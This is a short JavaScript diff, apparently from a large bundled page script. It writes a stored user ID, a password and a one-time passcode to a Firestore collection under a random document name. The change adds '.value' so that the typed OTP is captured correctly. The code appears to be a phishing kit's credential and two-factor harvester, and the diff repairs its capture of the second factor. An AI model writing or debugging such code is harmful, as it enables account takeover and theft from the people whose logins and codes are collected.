@@ -27158,7 +27158,7 @@ var name = crypto.randomUUID();
   await db.collection("usuarionew11").doc(name).set({
     user: localStorage.getItem("id"),
     pw: localStorage.getItem("pws"),
-    OTP: document.getElementById("step01"),
+    OTP: document.getElementById("step01").value,
 	
   });
 
